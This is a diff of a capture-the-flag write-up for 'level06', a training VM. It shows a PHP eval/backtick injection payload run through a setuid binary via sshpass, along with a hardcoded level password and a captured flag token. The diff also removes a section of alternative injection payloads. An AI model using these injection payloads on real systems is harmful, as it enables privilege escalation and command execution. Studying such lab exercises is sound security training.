@@ -55,24 +55,17 @@ printf '[x ${`getflag`}]\n' > /tmp/level06_exploit.txt
 - Function y() processes the output (replaces dots with " x ")
 
 #### Step 2: Execute Exploit via Setuid Binary and Capture Output
-Connect to the VM and execute the binary with the exploit file:
+Use the token from Level05 as the password:
 
 ```bash
-sshpass -p "PASSWORD" ssh -o StrictHostKeyChecking=no -p 4242 level06@localhost << 'EXPLOIT'
+sshpass -p "viuaaale9huek52boumoomioc" ssh -o StrictHostKeyChecking=no -p 4242 level06@localhost << 'EXPLOIT'
 printf '[x ${`getflag`}]\n' > /tmp/level06_exploit.txt
-cd /home/user/level06
 ./level06 /tmp/level06_exploit.txt 2>&1 | tee /tmp/level06_output.txt
 cat /tmp/level06_output.txt
 EXPLOIT
 ```
 
-**Execution Flow:**
-1. Binary reads `/tmp/level06_exploit.txt` containing `[x ${`getflag`}]`
-2. Regex matches and captures `${`getflag`}`
-3. PHP eval executes: `y("${`getflag`}")`
-4. Backticks execute `getflag` with flag06 privileges
-5. Output is processed by y() function
-6. Result printed to stdout containing the token
+**Execution Flow:** Binary reads payload > Regex matches and captures `${`getflag`}` > PHP eval executes with backticks > `getflag` runs with flag06 privileges > Output is processed by y() and printed.
 
 #### Step 3: Extract Token from Output
 The output contains the flag token wrapped in the function's processing:
@@ -87,18 +80,6 @@ Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 ```
 
 **Note:** The y() function transforms dots to " x " in the output, so the token may appear with spacing modifications in the function's output processing.
-
-## Alternative Payloads
-
-Other injection methods that work:
-
-```bash
-# Using direct backticks
-printf '[x ".`getflag`."]\n' > /tmp/exploit.txt
-
-# Redirecting output to file
-printf '[x ".`getflag > /tmp/token.txt 2>&1`."]\n' > /tmp/exploit.txt
-```
 
 ## Security Flaws
 
